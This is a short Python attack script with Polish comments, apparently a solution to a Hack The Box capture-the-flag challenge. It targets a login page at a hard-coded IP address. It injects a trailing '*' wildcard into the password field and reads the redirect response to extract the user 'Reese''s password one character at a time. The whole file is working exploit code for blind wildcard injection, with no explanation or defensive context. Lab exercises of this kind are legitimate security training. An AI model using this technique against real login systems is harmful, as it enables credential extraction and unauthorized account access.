import requests
import string
from time import sleep 

# Mozliwe znaki dla hasla z wykluczeniem * poniewaz to by zawsze przechodzilo
CHARS = list(filter(lambda x: x != '*',[ *string.punctuation ,*string.ascii_letters, "1","2","3","4","5","6","7","8","9","0"]))
# Cel ataku
URL = "http://206.189.121.131:31118/login"
# Nazwa użytnikownika
USERNAME = "Reese"

#Początkowe hasło
password = "HTB{d1" 

# Jeśli wskzane hasło jest poprawne zwracana jest wartość True w injnym wypadku false
def guess(password: str) -> bool:
    print("trying password: " + password)
    response = requests.post(URL,allow_redirects=False, data = {"username" : USERNAME, "password": password + "*"})
    if 'Location' not in response.headers:
        return False
    if '/' != response.headers['Location']:
        return False
    return True

# Zgaduj dopoki ostatni znak hasła nie jest równy '}' - znak końca flagi
while password[-1] != '}':
    for char in CHARS:
        sleep(0.1)
        if guess(password + char):
            print("Found: " + char)
            password += char 

print("Password:" + password)